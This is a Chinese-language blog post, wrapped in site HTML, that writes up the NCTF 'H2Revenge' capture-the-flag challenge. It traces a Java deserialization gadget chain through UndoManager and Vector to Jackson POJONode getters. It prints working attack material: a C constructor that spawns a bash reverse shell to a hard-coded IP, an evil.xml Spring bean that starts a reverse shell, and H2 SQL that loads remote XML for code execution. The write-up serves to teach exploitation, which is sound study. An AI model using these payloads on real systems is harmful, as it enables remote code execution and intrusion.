@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>H2Revenge(NCTF) - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="H2Revenge(NCTF) - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/04/27/H2Revenge(NCTF)/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-04-26T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-04-27T00:00:00+08:00">
+      April 27, 2025
+    </time>
+    
+
+    <h1 class="title">H2Revenge(NCTF)</h1>
+  </div>
+
+  <div class="content">
+    <h2 id="EventListenerList-UndoManager-Vector-toString利用链"><a href="#EventListenerList-UndoManager-Vector-toString利用链" class="headerlink" title="EventListenerList,UndoManager,Vector::toString利用链"></a>EventListenerList,UndoManager,Vector::toString利用链</h2><p>生成序列化payload的exp</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MmM0NmQzODY4N2U3MjJhOTJkOTRhZTdmMTk1YzFlMjFfd2pvY1dMNVRlTUh6TWM0SGpzOUQwZ1k0TnVpSGloVG1fVG9rZW46REg0bGJpTXNGb3NGYTB4QXQ0U2NndWpCbllHXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>因为edits属性是在UndoManager的父类里面，所以getFieldValue()函数加了一个没有在当前类中找到就在传入的class参数中找。</p>
+<p>EventListenerList::readObject(注意断点的那两处要强制步入)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODE1NWZkYThmNjc0YTE2OTMzNWY0OTRlOTc5ZjJmYTNfQ2s3MVFraWxtbUU4TjhqRFdmcGxNUzk0RHBSaDBWdkJfVG9rZW46STN5ZWI2T3Znb0l4ZVB4bElsWmNWYjhzbkViXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>进入add()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmY0MWRjNzc0MzZmODYzZDk5ZWUyMDdhYmIyOGZlNmNfUHZ1UWd2eFY4a3VNdHd3cnJOUEEybjBvTkdQUXc3OTRfVG9rZW46RU8yWmJLb25Zb0lqeHd4NHU1bGNjVHc4bmJmXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>调试可以看到add的参数t是生成序列化payload的exp中的这一步中的Map.class,i是这一步中的undoManager</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI0MGUwN2EyYzM1MGJlZWIwYjE2NDVhNTdiNTk1MTZfckhRdVpVQXpGd1h4eEVOYXBnTWF0dGpMb3U2RW9DSWhfVG9rZW46RVVqOGJxdmF4b1BBTDJ4MjMzWGNNZkpCbnJnXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>因为Map.class不是UndoManager的子类，所以进入报错代码块，即上图的上图，此时就调用了i,t的toString方法。</p>
+<p>Map::toString不重要，我们看UndoManager::toString</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZiYzNlZmIzY2RjYWVkMTE5ZTlkNjYwNTBiMTIzNWJfWlRxS0Q3VGduWGFRM0RDeFZ4bnFqOGZRS3p4WHRHU0tfVG9rZW46VEdSRGJscVJLb0VDb3R4SVhMZGNxc1lEbmtuXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>进入super.toString</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=M2QyZDA3NTAyZDM0MzRkM2NjN2VhNzExNjZlMWY5YzNfYU9RUWhRdnlHSWhabjlkR1FXUGkzaWltNzJZaXRUWXRfVG9rZW46QnpiZmI4cGhBb2FNMWl4NmdkM2NNbmFnbldmXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>此时edits::toString()被调用了</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkNWFmNDY4MTNkZDZmOGQ4NDRhMTdlYmFjODQyNzlfNHRWQzlMYTVuU3JqZEpDVXFDbnd0VTQzcHpqVDV6S2RfVG9rZW46TldIS2JKUDlvb1daSTV4MEtKVmNMS2c5bmI4XzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>edits是UndoManager父类CompoundEdit的属性，在实例化UndoManager的时候就会自动调用其父类的无参构造器，所以edits被赋值为Vector实例。</p>
+<p>所以edits::toString实际上调用的是Vector::toString</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWQ0MDM1NGExMDI0NGI4NWQ4MTUzZmYwNDNjMzg4M2JfTVlpRWJhcVU0NUJkUmlHbFBEQU5LcVJYYnRUZW1jaHBfVG9rZW46T05HUWJlYWVkb2dNN3F4dmRERWNVdWMybkJnXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZjZDJjZDcyNDBmNzIwMWMxODczZDJmNDc3MDNlODVfTDQ3OFhMVzBEMlY3dERsOFA1TDNVMmtWM01vUVNtd2lfVG9rZW46UndLT2JDNkFab3BleU54Q2hhMGNKdGxqbklnXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>由于java的动态绑定机制，iterator()实际上是调用的Vector::iterator(),所以这个toString函数遍历了Vector的elementdata属性，并且调用了其toString方法</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODNiOWUwZDdmZmEwYTY3NGEwZGQzZWExZTU1OTM1ZDFfbUhrRjJUeDJtTHdDQURZZ29hRDZkTVNIY1VjdEIzcnhfVG9rZW46TzZTU2JNWGpjb1cybUZ4Z010dWN4VUZBblZjXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>而生成序列化payload的exp中的Vector.add()就是往elementdata中添加成员，所以我们就可以选择要触发哪个类的toString方法</p>
+<h2 id="toString-getter-POJONode"><a href="#toString-getter-POJONode" class="headerlink" title="toString-&gt;getter(POJONode)"></a>toString-&gt;getter(POJONode)</h2><p>若我们想调用某个类的getter方法，只需要将pojonode的实例放进Vector.add()里面，再把要触发的getter的目标类放进pojonode的构造函数里面，但要记得去除pojonode父类valuenode的父类BaseJsonNode的writeReplace()方法，不然的话反序列化的时候会检查反序列化的类是否实现了writeReplace()这个方法，会报错</p>
+<p>调用PojoNode::toString之前的链子如上文所说。</p>
+<p>PojoNode本身没有toString方法，但它的爷爷类BaseJsonNode有,</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MTdkNWIwYmU4ZjFhOTI5OTBmYWU4OWZkZDdmYTFiOWVfMDY4emREMGNHUXVpQ2J1MHZkVGlQMmdNcGNuMGxxMzNfVG9rZW46TFBwYWJXVGR1b0Rxdld4b2psU2NmWlE3bktnXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUzOTkxYTg0OWRmZWIzM2Q1OTE2Yzg1ZmFlZDM2YTBfNTBuZWs5VEJvTTBNeGpBd2FJUzlzdGlVNHJ0ZUxKRVNfVG9rZW46QXRNeGJOb1V1b0xWMnZ4R2lMc2NmNUR6bmM3XzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>这里调用了ObjectWriter::writeValueAsString方法，类似于ObjectMapper::writeValueAsString,将对象序列化成Json字符串，在此过程中会遍历对象的getter方法。但具体实现有点复杂，就不跟进了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)_writeValueAndClose:<span class="number">4568</span>, ObjectMapper (com.fasterxml.jackson.databind)writeValueAsString:<span class="number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure>
+
+<p>这是大致调用栈，找一找名字差不多的，跟进一下就是了，我成功跟到了目标类的getter方法里面</p>
+<h2 id="H2Revenge"><a href="#H2Revenge" class="headerlink" title="H2Revenge"></a>H2Revenge</h2><p>反序列化脚本</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM3NzViNmNmZWM0YzIzYjcyMWNlZWFlYjZiZTllOTVfcjZqWjlCSTV5RTIwMEdYZWF2SE9DY1N1TWtGVlRqMHdfVG9rZW46QTV0R2JTQzFkbzRFTzl4cGNJT2NVT3VhbnRnXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>1.sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> FILE_WRITE(X<span class="string">&#x27;16进制数据&#x27;</span>，‘<span class="operator">/</span>tmp<span class="operator">/</span>exp.so’);</span><br><span class="line"><span class="keyword">CREATE</span> ALIEAS IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> System_load <span class="keyword">FOR</span> java.lang.System.load(java.lang.String);</span><br><span class="line"><span class="keyword">CALL</span> System_load(<span class="string">&#x27;/tmp/exp.so&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>c文件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((__constructor__)) <span class="function"><span class="type">void</span> <span class="title">preload</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.200.78.188/1313 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将c编译成.so文件。</p>
+<p>用hexed将.so文件的16进制导出为.hex文件，复制里面的值到1.sql里</p>
+<p>vps成功收到GET &#x2F;1.sql,但没反弹shell，复现失败（我试了另一种方法，成功了）。</p>
+<p>失败原因是h2根本没有FILE_WRITE这个方法</p>
+<p>明天学学第二种方法</p>
+<p>未成功</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Err0r233/article/details/146484415">https://blog.csdn.net/Err0r233/article/details/146484415</a></p>
+<p>成功</p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2025/03/nctf-2024-web-writeup/#h2revenge">https://exp10it.io/2025/03/nctf-2024-web-writeup/#h2revenge</a></p>
+<h3 id="成功方法"><a href="#成功方法" class="headerlink" title="成功方法"></a>成功方法</h3><p>利用ClassPathXmlApplicationContext类</p>
+<p>这是其中一个构造函数</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OTI1MmU1N2Q0ZGU5OGQxNzkzZDk4OGQyMTA0OTQwOWJfUjAwVUJoSENveVQyQnV1OFE1Vm9WdE9YZ0d6N3lBcGJfVG9rZW46RjBHS2IwZE1Jb3pOWDh4WmFmM2NXOEVibm4xXzE3NzQxNTI2Njg6MTc3NDE1NjI2OF9WNA" alt="img"></p>
+<p>这个构造函数可以远程加载恶意的xml文档。</p>
+<p>调用这个构造函数会实例化xml文档中的bean,如果还设置了init-Method,还会在实例化后调用指定的method.</p>
+<p>这就是这道题对应的evil.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/host.docker.internal/4444 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>恶意sql文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="keyword">FOR</span> <span class="string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="keyword">FOR</span> <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="keyword">FOR</span> <span class="string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_str</span><span class="operator">=</span><span class="string">&#x27;http://host.docker.internal:8000/evil.xml&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@url_obj</span><span class="operator">=</span>UNESCAPE_VALUE(<span class="variable">@url_str</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@context_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@string_clazz</span><span class="operator">=</span>CLASS_FOR_NAME(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> NEW_INSTANCE(<span class="variable">@context_clazz</span>, <span class="keyword">ARRAY</span>[<span class="variable">@string_clazz</span>], <span class="keyword">ARRAY</span>[<span class="variable">@url_obj</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>为什么要调用unescapeValue()？因为在sql中url_str是varchar类型，而在ClassPathXmlApplicationContext构造函数需要的是Object类型，UnescapeValue()这个函数就是将String转换为Object</p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/06/03/fastjson/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">fastjson</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/04/25/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Hessian反序列化</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
